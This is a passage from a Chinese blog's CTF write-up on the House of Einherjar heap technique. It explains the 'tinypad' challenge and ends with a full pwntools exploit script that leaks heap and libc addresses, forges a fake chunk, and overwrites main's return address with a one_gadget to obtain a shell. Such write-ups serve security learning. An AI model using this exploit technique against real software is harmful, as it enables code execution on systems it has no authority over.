+<p>然后申请的时候就申请到了 fake chunk 那里，同时把 tinypad+0x100 那里的指针改成 size 跟 environ 的地址，通过 environ 函数泄漏 main 函数 retn 的地址，然后把这个地址覆盖为 one_gadget</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1599975425284-ce4533f5-6374-441c-a3d2-b6405d3163c0.png#align=left&display=inline&height=320&margin=%5Bobject%20Object%5D&name=image.png&originHeight=392&originWidth=603&size=88575&status=done&style=none&width=493" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>接下来直接在 chunk1 的 content 处就可以看到 0x7ffff7dd3f38 处的 0x7fffffffde48<br>然后要根据这个来算出距离 main_ret 处的偏移<br>（直接在快要 ret 的那里下个断点，然后 <code>c</code> 运行到那里）</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1599980540990-da334df6-9e0b-46b4-b845-695679346ab5.png#align=left&display=inline&height=482&margin=%5Bobject%20Object%5D&name=image.png&originHeight=769&originWidth=807&size=161024&status=done&style=none&width=506" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>接下来通过编辑第二个 chunk 把之前写 environ_pointer 的地址改成 main_ret 的地址，然后通过编辑 chunk1 把 main_ret 改成 one_gadget 然后正常的退出就可以啦</p>
+<p>完整 exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">'./tinypad'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">p = process(<span class="string">'./tinypad'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(choice)</span>:</span></span><br><span class="line">  p.sendlineafter(<span class="string">"(CMD)&gt;&gt;&gt; "</span>, choice)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size, content)</span>:</span></span><br><span class="line">  cmd(<span class="string">"A"</span>)</span><br><span class="line">  p.sendlineafter(<span class="string">"(SIZE)&gt;&gt;&gt; "</span>, str(size))</span><br><span class="line">  p.sendlineafter(<span class="string">"(CONTENT)&gt;&gt;&gt; "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">  cmd(<span class="string">"D"</span>)</span><br><span class="line">  p.sendlineafter(<span class="string">"(INDEX)&gt;&gt;&gt; "</span>, str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index, content)</span>:</span></span><br><span class="line">  cmd(<span class="string">"E"</span>)</span><br><span class="line">  p.sendlineafter(<span class="string">"(INDEX)&gt;&gt;&gt; "</span>, str(index))</span><br><span class="line">  p.sendlineafter(<span class="string">"(CONTENT)&gt;&gt;&gt; "</span>, content)</span><br><span class="line">  p.sendlineafter(<span class="string">"(Y/n)&gt;&gt;&gt; "</span>, <span class="string">"Y"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">quit</span><span class="params">()</span>:</span></span><br><span class="line">  cmd(<span class="string">"Q"</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x80</span>, <span class="string">'a'</span>*<span class="number">0x80</span>)</span><br><span class="line">create(<span class="number">0x80</span>, <span class="string">'b'</span>*<span class="number">0x80</span>)</span><br><span class="line">create(<span class="number">0x80</span>, <span class="string">'c'</span>*<span class="number">0x80</span>)</span><br><span class="line">create(<span class="number">0x80</span>, <span class="string">'d'</span>*<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">"INDEX: 1\n"</span>)</span><br><span class="line">p.recvuntil(<span class="string">" # CONTENT: "</span>)</span><br><span class="line">heap_addr = u64(p.recvline().rstrip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">0x120</span></span><br><span class="line">p.recvuntil(<span class="string">"INDEX: 3\n"</span>)</span><br><span class="line">p.recvuntil(<span class="string">" # CONTENT: "</span>)</span><br><span class="line">main_arena_addr = u64(p.recvline().strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">88</span></span><br><span class="line">libc_base = main_arena_addr - <span class="number">0x3c4b20</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"======== some addrs ======="</span></span><br><span class="line"><span class="keyword">print</span> hex(main_arena_addr)</span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line"><span class="keyword">print</span> hex(heap_addr)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,'b *0x400E4E')</span></span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">'1'</span>*<span class="number">0x10</span>)</span><br><span class="line">create(<span class="number">0x100</span>, <span class="string">'2'</span>*<span class="number">0xf8</span>+p64(<span class="number">0x11</span>))</span><br><span class="line">create(<span class="number">0x100</span>, <span class="string">'3'</span>*<span class="number">0xf8</span>)</span><br><span class="line">create(<span class="number">0x100</span>, <span class="string">'4'</span>*<span class="number">0xf8</span>)</span><br><span class="line"></span><br><span class="line">tinypad = <span class="number">0x0602040</span></span><br><span class="line">offset = heap_addr - tinypad</span><br><span class="line"><span class="keyword">print</span> <span class="string">"============ offset ==========="</span></span><br><span class="line"><span class="keyword">print</span> offset</span><br><span class="line">fake_chunk = p64(<span class="number">0</span>) + p64(<span class="number">0x101</span>) + p64(<span class="number">0x602060</span>)*<span class="number">2</span></span><br><span class="line">edit(<span class="number">3</span>, <span class="string">"a"</span>*<span class="number">0x20</span> + fake_chunk)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x18</span>, <span class="string">'1'</span>*<span class="number">0x10</span> + p64(offset))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">4</span>, <span class="string">"4"</span>*<span class="number">0x20</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x101</span>) + p64(main_arena_addr + <span class="number">88</span>)*<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">one_gadget = libc_base + <span class="number">0x45226</span></span><br><span class="line">environ_pointer = libc_base + libc.symbols[<span class="string">'__environ'</span>]</span><br><span class="line">create(<span class="number">0xf0</span>, <span class="string">'6'</span>*<span class="number">0xd0</span> + p64(<span class="number">0x18</span>) + p64(environ_pointer) + <span class="string">'a'</span>*<span class="number">8</span> + p64(<span class="number">0x602148</span>))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">" #   INDEX: 1\n"</span>)</span><br><span class="line">p.recvuntil(<span class="string">" # CONTENT: "</span>)</span><br><span class="line">leak_addr = u64(p.recvline().rstrip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">main_ret = leak_addr - <span class="number">0x8</span> * <span class="number">30</span></span><br><span class="line">p.success(<span class="string">"main_ret: %x"</span> % main_ret)</span><br><span class="line">p.success(<span class="string">"leak_addr: %x"</span> % leak_addr)</span><br><span class="line">edit(<span class="number">2</span>, p64(main_ret))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">edit(<span class="number">1</span>, p64(one_gadget))</span><br><span class="line">quit()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <div class="content">
+        
+<span class="post-time">
+    最后更新时间：<time datetime="2020-09-16T08:07:09.195Z" itemprop="dateUpdated">2020-09-16 16:07:09</time>
+</span><br>
+
+
+        
+    </div>
+    
+    <footer>
+        <a href="https://yichen115.github.io">
+            <img src="/img/avatar.png" alt="yichen">
+            yichen
+        </a>
+    </footer>
+</blockquote>
+
+        
+<div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+
+
+        <div class="post-footer">
+            
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://yichen115.github.io/2020/09/08/hwrtn9/&title=《House Of Einherjar》 — yichen's blog&pic=https://yichen115.github.io/img/avatar.png" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://yichen115.github.io/2020/09/08/hwrtn9/&title=《House Of Einherjar》 — yichen's blog&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://yichen115.github.io/2020/09/08/hwrtn9/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《House Of Einherjar》 — yichen's blog&url=https://yichen115.github.io/2020/09/08/hwrtn9/&via=https://yichen115.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://yichen115.github.io/2020/09/08/hwrtn9/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2020/09/13/gwcg1c/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">House Of Force</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2020/09/04/qlry85/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">Tcache Attack</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</article>
+
+<div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        谢谢大爷~
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/img/wechat.jpg" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/wechat.jpg" data-alipay="/img/alipay.jpg">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechat">微信</span>
+                <span class="reward-toggle-label"></span>
+                <span class="reward-toggle-item alipay">支付宝</span>
+            </div>
+        </label>
+        
+    </div>
+</div>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>博客内容遵循 <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>yichen &copy; 2020</span>
+            <span>
+                
+                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://yichen115.github.io/2020/09/08/hwrtn9/&title=《House Of Einherjar》 — yichen's blog&pic=https://yichen115.github.io/img/avatar.png" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://yichen115.github.io/2020/09/08/hwrtn9/&title=《House Of Einherjar》 — yichen's blog&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://yichen115.github.io/2020/09/08/hwrtn9/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《House Of Einherjar》 — yichen's blog&url=https://yichen115.github.io/2020/09/08/hwrtn9/&via=https://yichen115.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://yichen115.github.io/2020/09/08/hwrtn9/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="//api.qrserver.com/v1/create-qr-code/?data=https://yichen115.github.io/2020/09/08/hwrtn9/" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+<script>
+(function() {
+    var OriginTitile = document.title, titleTime;
+    document.addEventListener('visibilitychange', function() {
+        if (document.hidden) {
+            document.title = '记得回来啊！';
+            clearTimeout(titleTime);
+        } else {
+            document.title = '欢迎回来!';
+            titleTime = setTimeout(function() {
+                document.title = OriginTitile;
+            },2000);
+        }
+    });
+})();
+</script>
+
+
+
+</body>
+</html>
